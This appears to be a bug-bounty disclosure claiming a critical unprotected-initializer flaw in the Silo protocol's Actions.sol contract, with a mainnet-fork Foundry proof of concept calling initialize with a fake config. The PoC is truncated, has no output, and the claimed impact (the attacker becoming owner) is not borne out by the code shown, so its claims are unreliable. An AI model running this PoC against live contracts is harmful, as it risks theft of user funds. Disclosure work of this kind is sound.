**Contract hijack via unprotected initialize in Actions.sol**

_Bug Severity:_ Critical 

_Target:_ https://sonicscan.org/address/0x435Ab368F5fCCcc71554f4A8ac5F5b922bC4Dc06?utm_source=immunefi#code#F10#L43-53





**Summary:**

Actions.sol acts as middleware in silo protocol, meaning if a user calls deposit or withdraw from silo.sol, the silo.sol will make an external call to Actions.sol, this contract handles multiple tasks such as:

accrueInterest, reentrancy protection, hook receiver, shareToken and asset addresses, interacts with vaults that change the storage.




**Vulnerability Details:**

After deep manual reviews i found out that the  attacker can get access and hijack the Actions.sol via calling initialize with malicious Config, fake hook receiver, shareToken and asset addresses, because the initialize function is unprotected, it lacks onlyOwner or initializer from openzepplin, because of that, anyone can call it and hijack the contract.

Furthermore, the silo's admin forgot to call initialize manually and it was not called in silo.sol constructor.

```solidity
// Actions.sol
@audit-bug-->  function initialize(ISiloConfig _siloConfig) external returns (address hookReceiver) { // ⚠️ BUG: Missing onlyOwner/initializer
        IShareToken.ShareTokenStorage storage _sharedStorage = ShareTokenLib.getShareTokenStorage();

        require(address(_sharedStorage.siloConfig) == address(0), ISilo.SiloInitialized());

        ISiloConfig.ConfigData memory configData = _siloConfig.getConfig(address(this));

        _sharedStorage.siloConfig = _siloConfig;

        return configData.hookReceiver;
    }
```




**Impact Details:**

- Attacker can fully hijack the Actions.sol contract by calling initialize() with malicious config.

- The attacker can point hookReceiver, shareToken, and other vault interactions to addresses under their control.

- This allows arbitrary logic injection into protocol flows, including vault draining and disabling of reentrancy protection.

- Once hijacked, the protocol team cannot reclaim the contract, leading to permanent loss of control and user funds.




**Proof of Concept (POC)**

The below PoC shows how an attacker called initialize function with malicious siloConfig, fake hook receiver, shareToken and asset addresses, finally the attacker became the owner of the Actions.sol contract.


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

... existing code ...

contract FakeSiloConfig is ISiloConfig {
    function getConfig(address) external pure override returns (ConfigData memory) {
        return ConfigData({
            hookReceiver: address(0x90581aFC83520a649376852166B3df92153cEE20),  // You can put any address
            silo: address(0x39AA39c021dfbaE8faC545936693aC917d5E7563)  // put any address
        });
    }
}

contract SiloActionsInitialize is Test {
    address constant ACTIONS = 0x1F13CcDBd7cB2021e499D23478Dc292d48211c04; // Actions.sol mainnet address

    FakeSiloConfig fakeConfig;

    function setUp() public {
        vm.createSelectFork(vm.envString("SONIC_RPC_URL"), 34402746);

        fakeConfig = new FakeSiloConfig();
    }

    function test_Initialize() public {
       
        (bool success, bytes memory data) = ACTIONS.call(
            abi.encodeWithSelector(
                IActions.initialize.selector,
                fakeConfig
            )
        );
        require(success, string(data));
    }
}
```


**PoC Output:**
